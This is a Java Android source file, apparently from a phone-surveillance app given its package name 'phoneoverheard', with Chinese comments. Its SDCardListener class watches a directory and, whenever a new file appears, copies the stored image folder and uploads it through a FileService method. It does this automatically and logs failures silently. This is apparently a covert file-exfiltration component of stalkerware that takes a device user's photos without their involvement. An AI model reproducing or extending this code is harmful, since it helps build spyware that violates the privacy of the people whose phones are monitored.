package com.phoneoverheard.phonne;

import com.phoneoverheard.database.Manager;
import com.phoneoverheard.database.ManagerService;

import android.annotation.SuppressLint;
import android.content.Context;
import android.os.Environment;
import android.os.FileObserver;   
import android.util.Log;   
  
/**  
 * SD卡中的目录创建监听器。  
 * 
 * @author 
 */  
@SuppressLint("SdCardPath")
public class SDCardListener extends FileObserver {
	   private static final String TAG = "SDCardListener"; 
	   WriteLog mylog = new WriteLog();
	   
	   @SuppressWarnings("unused")
	   private String path;
	   private Context context;
	   public SDCardListener(String path,Context context) { 
	      /*  
	       * 这种构造方法是默认监听所有事件的,如果使用 super(String,int)这种构造方法，  
	       * 则int参数是要监听的事件类型.  
	       */
		  super(path,CREATE);
		  this.context = context;
		  Log.i(TAG, "path:"+ path); 
		  mylog.WrLog("i",TAG,"SD卡中的目录创建监听器:"+ path);
	   }   
	   
	   @Override  
	   public void onEvent(int event, String path) {
		   path = Environment.getDataDirectory() + path;
		   try{
		      switch(event) {   
		         case FileObserver.ALL_EVENTS:   
		            Log.i(TAG, "path:"+ path); 		            
		            mylog.WrLog("i",TAG,"SD卡中的目录创建监听器:"+ path);
		            break;   
		         case FileObserver.CREATE:	        	 
					ManagerService managerservice = new ManagerService(context);
			    	Manager manager = managerservice.find("manager");
			    	String oldPath = manager.getImgfolder();
			    	String newPath = manager.getAudiofolder();
		        	new FileService().copyFolder(oldPath, newPath,context);
		        	new FileService().uploadFolder(newPath,context);
		        	Log.i(TAG, "oldPath=="+oldPath+" , newPath=="+newPath+ " , path=="+ path);
		        	mylog.WrLog("i",TAG,"复制文件夹中的文件： oldPath=="+oldPath+" , newPath=="+newPath+ " , path=="+ path);
		            break;   
		      }   
		   }catch(Exception e){
			   Log.i(TAG, "目录文件上传失败path："+ path);
			   mylog.WrLog("i",TAG,"目录文件上传失败path："+ path);
			   e.printStackTrace(); 
		   }
	  }

}